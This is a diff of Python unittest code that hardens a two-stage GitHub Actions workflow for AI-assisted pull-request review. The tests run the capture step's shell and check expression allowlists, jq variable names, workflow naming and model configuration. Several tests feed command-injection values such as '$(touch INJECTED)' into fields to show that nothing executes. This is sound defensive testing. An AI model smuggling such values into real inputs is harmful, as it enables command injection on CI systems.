+            "github.event.pull_request.base.sha": "40-hex, GitHub-computed",
+            "github.event.pull_request.base.ref": "the BASE branch, which "
+            "exists in this repository, so a maintainer named it",
+            "github.event.pull_request.head.repo.full_name != github.repository": (
+                "a comparison: the result is a boolean, never the repo name"
+            ),
+            "github.event.action": "one of the four declared trigger types",
+        }
+        found = {
+            " ".join(e.split()) for e in re.findall(r"\$\{\{(.*?)\}\}", self.text, re.S)
+        }
+        unexpected = found - set(allowed)
+        self.assertEqual(
+            unexpected,
+            set(),
+            f"Stage 1 interpolates {sorted(unexpected)}, which is not on the "
+            "reviewed list in this test. If the new value is GitHub-generated "
+            "and not contributor-authored, add it here with the reason. If a "
+            "contributor can write it, it does not belong in this workflow.",
+        )
+
+    # --- and the shell itself, RUN rather than read ------------------------
+
+    def _capture_run(self) -> str:
+        step = self.capture.split("Capture PR coordinates", 1)[1]
+        return textwrap.dedent(scalar_block(step.split("- name:", 1)[0], "run"))
+
+    def _execute(self, **overrides):
+        """Run the capture step's real shell. Returns (rc, parsed json|None)."""
+        env = {
+            "PATH": "/usr/bin:/bin",
+            "PR_NUM": "12345",
+            "HEAD_SHA": "a" * 40,
+            "BASE_SHA": "b" * 40,
+            "BASE_REF": "main",
+            "IS_FORK": "true",
+            "TRIGGER_EVENT": "labeled",
+            "REVIEW_LABEL": "in progress",
+        }
+        env.update(overrides)
+        with tempfile.TemporaryDirectory() as td:
+            proc = subprocess.run(
+                ["bash", "-c", self._capture_run()],
+                cwd=td,
+                capture_output=True,
+                text=True,
+                env=env,
+            )
+            out = Path(td) / "pr-review-request.json"
+            raw = out.read_text() if out.is_file() else None
+            marker = (Path(td) / "INJECTED").exists()
+        # `None` = no file. A file that is EMPTY or unparsable is also `None`
+        # here, and that case is real rather than hypothetical: the redirect
+        # `> pr-review-request.json` creates the file before jq runs, so a jq
+        # failure leaves a 0-byte file behind. Treating that as "no usable
+        # artifact" is right — and the step has already exited non-zero under
+        # `set -e`, so the upload step never runs on that path.
+        try:
+            parsed = json.loads(raw) if raw else None
+        except json.JSONDecodeError:
+            parsed = None
+        return proc.returncode, parsed, marker
+
+    def test_a_well_formed_event_captures_exactly_the_declared_fields(self):
+        rc, doc, _ = self._execute()
+        self.assertEqual(rc, 0)
+        self.assertEqual(
+            doc,
+            {
+                "pr_number": 12345,
+                "head_sha": "a" * 40,
+                "base_sha": "b" * 40,
+                "base_ref": "main",
+                "is_fork": True,
+                "trigger_event": "labeled",
+                "trigger_label": "in progress",
+            },
+            "the artifact's shape changed; Stage 2 validates these keys by name",
+        )
+
+    def test_a_shell_payload_in_any_field_is_refused_and_never_runs(self):
+        """The property `env:` plus quoting is supposed to give, MEASURED.
+
+        Each payload would create `INJECTED` if the value were ever reaching a
+        shell as code rather than as data.
+
+        ALL SEVEN FIELDS, which the name promises and an earlier version did
+        not deliver — it covered the four that carry an explicit regex and
+        stopped there, so `IS_FORK`, `TRIGGER_EVENT` and `REVIEW_LABEL` were
+        outside a test that claimed "any field". Their outcomes DIFFER, and
+        the difference is the point:
+
+          * the four regex-guarded fields are rejected before jq;
+          * `IS_FORK` goes to `--argjson`, so a non-JSON value is a hard jq
+            failure — same safe outcome, different mechanism;
+          * `TRIGGER_EVENT` and `REVIEW_LABEL` go to `--arg`, which takes any
+            string, so they are ACCEPTED and land in the artifact as data.
+            That is correct here: neither is contributor-controlled, and
+            Stage 2 re-validates `trigger_event` against a literal allowlist
+            before using it. What must hold for all seven is that nothing
+            EXECUTES.
+        """
+        payload = 'main"; touch INJECTED; #'
+        rejected = ("PR_NUM", "HEAD_SHA", "BASE_SHA", "BASE_REF", "IS_FORK")
+        passed_through = ("TRIGGER_EVENT", "REVIEW_LABEL")
+        for field in rejected + passed_through:
+            with self.subTest(field=field):
+                rc, doc, injected = self._execute(**{field: payload})
+                # The invariant that holds for every field, without exception.
+                self.assertFalse(injected, f"{field} reached a shell as code")
+                if field in rejected:
+                    self.assertNotEqual(rc, 0, f"{field} was accepted: {doc}")
+                    self.assertIsNone(doc, f"{field} reached the artifact")
+                else:
+                    self.assertEqual(rc, 0, f"{field} unexpectedly failed the step")
+                    self.assertIsNotNone(doc, f"{field} produced no artifact")
+                    # Carried as a JSON string value, not as anything else.
+                    self.assertIn(payload, doc.values())
+
+    def test_a_substitution_in_a_field_is_data_not_a_command(self):
+        """`$(...)` specifically: the form that needs no quote to escape."""
+        rc, doc, injected = self._execute(BASE_REF="$(touch INJECTED)")
+        self.assertFalse(injected, "a command substitution in base_ref executed")
+        self.assertNotEqual(rc, 0)
+        self.assertIsNone(doc)
+
+    def test_the_pr_number_regex_is_what_rejects_a_bad_pr_number(self):
+        """ISOLATING THE CONTROL, because the test above cannot.
+
+        `PR_NUM` is the one field passed with `--argjson`, so jq refuses a
+        non-JSON value on its own. Deleting the `^[0-9]+$` check therefore left
+        the shell-payload test above still passing — the payload was rejected,
+        just by jq rather than by the guard the test is named for. The
+        mutation battery caught that: dropping the regex SURVIVED.
+
+        These values are all valid JSON and none is a PR number, so jq accepts
+        every one of them and the regex is the only thing that does not. Each
+        would otherwise reach the artifact as `pr_number` and be re-validated
+        by Stage 2 — which is a real second fence, and exactly why this one
+        has to be tested for what IT does rather than for the outcome.
+        """
+        for value in ("[1,2]", '{"a":1}', "null", "true", "1.5", "-7"):
+            with self.subTest(pr_num=value):
+                rc, doc, _ = self._execute(PR_NUM=value)
+                self.assertNotEqual(
+                    rc,
+                    0,
+                    f"PR_NUM={value!r} was accepted; it is valid JSON, so jq "
+                    "does not stop it and the regex is the only guard that "
+                    f"can. Artifact: {doc}",
+                )
+                self.assertIsNone(doc, f"PR_NUM={value!r} reached the artifact")
+
+
+class TestNoJqArgumentIsAJqKeyword(unittest.TestCase):
+    """`--arg label` parses on jq 1.7 and is a SYNTAX ERROR on jq 1.6.
+
+    Found by executing Stage 1's capture step rather than reading it: jq
+    reserves `label` for `label $out | ... | break $out`, so 1.6 rejects
+    `$label` with "unexpected label, expecting IDENT" before running anything.
+    1.7 accepts it. `runs-on: ubuntu-latest` is not a pinned image — it was
+    ubuntu-22.04, and jq 1.6, until GitHub moved it — so this is a live
+    dependency on which image the job happens to land on.
+
+    The failure mode is the bad one. Stage 1 exits non-zero and uploads no
+    artifact, and a missing artifact is exactly what a PR nobody labelled
+    produces, so the pipeline goes quiet rather than red.
+
+    Cheap to avoid entirely: never name a jq variable after a jq keyword.
+    """
+
+    # MEASURED, not recalled. Every candidate was run through
+    # `jq -n --arg <name> x '{a: $<name>}'` on jq 1.6, and this is the set that
+    # was REJECTED. Guessing the list got it wrong in both directions at once:
+    # it omitted `break` and `module`, which really are refused, and included
+    # `__loc__`, which jq accepts perfectly well as a variable name. `not` is a
+    # builtin rather than a lexer keyword and is accepted too, so neither is
+    # here — a false entry in this set would red a legal workflow.
+    JQ_KEYWORDS = frozenset(
+        """def as label import include if then else elif end
+           and or reduce foreach try catch break module""".split()
+    )
+
+    def test_no_workflow_passes_jq_a_variable_named_after_a_keyword(self):
+        for path in (STAGE1, STAGE2):
+            names = re.findall(
+                r"--arg(?:json)?\s+([A-Za-z_][\w]*)", strip_comments(path.read_text())
+            )
+            self.assertTrue(
+                names, f"premise changed: {path.name} calls jq with no --arg"
+            )
+            clashes = sorted(set(names) & self.JQ_KEYWORDS)
+            self.assertEqual(
+                clashes,
+                [],
+                f"{path.name} passes jq a variable named {clashes}, which jq "
+                "1.6 rejects at parse time. Rename it; the jq program is the "
+                "only place the name is used.",
+            )
+
+
+class TestNoOtherWorkflowClaimsTheStage1Name(unittest.TestCase):
+    """Stage 2 subscribes by workflow NAME, so the name has to be unique.
+
+    `.github/scripts/ensure_actions_will_cancel.py` enforced that, among other
+    things — but it selects files with `"pull_request" in on`, an exact key
+    match, so moving Stage 1 to `pull_request_target` took it out of that
+    check. This replaces the part of it that mattered here.
+
+    A duplicate would need to be added to the DEFAULT branch, so this is not the
+    lookalike-from-a-PR case; it is the maintainer who copies this file to
+    start a variant and leaves the `name:` alone. Stage 2 would then be driven
+    by whichever finished, and `github.event.workflow.path` compares
+    case-INSENSITIVELY, so a copy at a differently-cased path is not separated
+    by that pin either.
+    """
+
+    def test_exactly_one_workflow_is_called_hardened_pr_review(self):
+        wanted = "Hardened PR Review"
+        claimants = []
+        # BOTH extensions. GitHub reads `.yml` and `.yaml`, and scanning only
+        # one of them is how the duplicate this test exists to forbid gets in.
+        files = sorted(set(WORKFLOWS.glob("*.yml")) | set(WORKFLOWS.glob("*.yaml")))
+        for path in files:
+            for ln in strip_comments(path.read_text()).splitlines():
+                if (m := _key_re("name").match(ln)) and len(ln) - len(ln.lstrip()) == 0:
+                    # FAIL CLOSED on a spelling this reader cannot decode. A
+                    # `name: >-` with the text on the following line really is
+                    # that name, and reading only the key's own line returned
+                    # the block header — so the workflow was silently not a
+                    # claimant. The reader is line-at-a-time by design; what it
+                    # must not do is treat "I could not read it" as "it is not
+                    # the same name".
+                    raw = uncommented(m.group(1))
+                    self.assertIsNone(
+                        BLOCK_HEADER.fullmatch(raw),
+                        f"{path.name} writes its workflow `name:` as a block "
+                        f"scalar ({raw!r}); this reader cannot decode that, so "
+                        "it cannot tell whether the name collides with Stage "
+                        "1's. Unfold it, or teach the reader.",
+                    )
+                    # CASEFOLDED, for consistency with the reasoning three
+                    # files away: GitHub's expression `==` ignores case, which
+                    # is why the workflow-path pin is not a lookalike defence.
+                    # Whether `workflows:` matches names case-insensitively is
+                    # not documented either way, so a workflow called
+                    # `hardened pr review` is treated as a claimant here rather
+                    # than assumed harmless. A false positive costs a rename.
+                    if plain_scalar(raw).casefold() == wanted.casefold():
+                        claimants.append(path.name)
+                    break
+        self.assertEqual(
+            claimants,
+            [STAGE1.name],
+            f"{len(claimants)} workflows are named {wanted!r} ({claimants}). "
+            "Stage 2 triggers on that name, so every one of them can drive it.",
+        )
+
+
+class TestTheReviewModelIsNamedOnceAtTheTop(unittest.TestCase):
+    """The model id was buried in `claude_args:`, ten lines into a block scalar
+    that is otherwise security-critical flags. Changing it meant editing that
+    block, which is the last place a routine change should land.
+
+    It is also the answer to review question Q4 on #196845.
+    """
+
+    def setUp(self):
+        self.text = STAGE2.read_text()
+        self.stripped = strip_comments(self.text)
+
+    def test_the_model_is_a_workflow_level_env_next_to_the_role(self):
+        header = self.stripped.split("jobs:", 1)[0]
+        m = re.search(r"(?m)^\s{2}REVIEW_MODEL:\s*(\S+)\s*$", header)
+        self.assertIsNotNone(m, "REVIEW_MODEL is not a workflow-level env in Stage 2")
+        self.assertRegex(
+            m.group(1),
+            r"^global\.anthropic\.claude-[\w.-]+$",
+            f"REVIEW_MODEL is {m.group(1)!r}, which is not a Bedrock global "
+            "inference-profile id; the review step would fail to resolve it.",
+        )
+
+    def test_claude_args_takes_the_model_from_that_env_and_hardcodes_none(self):
+        review = strip_comments(job_block(self.text, "review"))
+        # The action's INPUTS, via the same reader the checkout tests use, so
+        # a `claude_args:` moved into the step's `env:` cannot stand in for it.
+        step = next(s for s in review.split("- name:") if "claude_args:" in s)
+        args = scalar_block("\n".join(with_block(step)), "claude_args")
+        self.assertRegex(
+            args,
+            r"--model\s+\$\{\{\s*env\.REVIEW_MODEL\s*\}\}",
+            "the review step does not take its model from REVIEW_MODEL",
+        )
+        # No second, literal id anywhere in the job — that is how the env var
+        # ends up decorative while a stale id is what actually runs.
+        leftovers = re.findall(r"global\.anthropic\.[\w.-]+", review)
+        self.assertEqual(
+            leftovers,
+            [],
+            f"a literal model id is still spelled out in the review job "
+            f"({leftovers}); REVIEW_MODEL would then not be the thing that decides.",
+        )
+
+
+class TestTheChangedFileListIsAPointerNotAPayload(unittest.TestCase):
+    """The validator names a file for the model to Read instead of printing the
+    changed-file list into its system message (#196844, Jean, major).
+
+    That only works if three places spell the same path: the step that WRITES
+    the list, the `--allowedTools` rule that lets the model open it, and the
+    env var the validator is told to name. Any one of them drifting turns an
+    actionable message into a pointer at nothing — and the validator's
+    fallback would hide it, since it degrades quietly to naming the diff.
+    """
+
+    def setUp(self):
+        self.text = STAGE2.read_text()
+        self.review = strip_comments(job_block(self.text, "review"))
+
+    def test_the_three_spellings_of_the_file_list_path_agree(self):
+        env = re.search(r"(?m)^\s+PR_REVIEW_FILES_FILE:\s*(\S+)\s*$", self.review)
+        self.assertIsNotNone(env, "the review step does not set PR_REVIEW_FILES_FILE")
+        path = env.group(1)
+        self.assertIn(
+            f"> {path}",
+            self.review,
+            f"no step writes {path}; the validator would point the model at a "
+            "file that is not there.",
+        )
+        self.assertIn(
+            f"Read(/{path})",
+            self.review,
+            f"the model is not granted Read on {path}, so the pointer the "
+            "validator prints is unusable.",
+        )
+        self.assertIn(
+            path,
+            self.review.split("prompt:", 1)[1],
+            f"the prompt no longer tells the model that {path} exists",
+        )
 
 
 class TestSymlinkScrubIsNulSafe(unittest.TestCase):
@@ -2198,13 +3295,16 @@ class TestTheReadersPremisesStillHold(unittest.TestCase):
                 "directory name it looks like",
             )
 
-    # The four steps this suite EXECUTES. Each is extracted with `scalar_block`
-    # and handed to bash, so each must be a LITERAL block.
+    # Every step this suite EXECUTES. Each is extracted with `scalar_block`
+    # and handed to bash, so each must be a LITERAL block. Carries the FILE as
+    # well as the job: Stage 1's capture step is executed too, and keying this
+    # list to STAGE2 alone silently exempted it.
     EXECUTED_STEPS = (
-        ("prepare", "Download Stage-1 artifact"),
-        ("prepare", "Close out an oversized request"),
-        ("prepare", "Corroborate the claimed PR against the trusted API"),
-        ("review", "Fetch the merge base"),
+        (STAGE2, "prepare", "Download Stage-1 artifact"),
+        (STAGE2, "prepare", "Close out an oversized request"),
+        (STAGE2, "prepare", "Corroborate the claimed PR against the trusted API"),
+        (STAGE2, "review", "Fetch the merge base"),
+        (STAGE1, "capture", "Capture PR coordinates"),
     )
 
     def test_every_executed_step_uses_a_literal_block_scalar(self):
@@ -2215,9 +3315,8 @@ class TestTheReadersPremisesStillHold(unittest.TestCase):
         the comments above it join into one line — so the executable tests
         would pass against code that is not what runs.
         """
-        text = STAGE2.read_text()
-        for job, marker in self.EXECUTED_STEPS:
-            block = job_block(text, job)
+        for path, job, marker in self.EXECUTED_STEPS:
+            block = job_block(path.read_text(), job)
             self.assertIn(marker, block, f"premise changed: {marker!r} is not in {job}")
             step = block.split(marker, 1)[1].split("- name:", 1)[0]
             # The step's OWN `run:`, found the same way the readers find it —
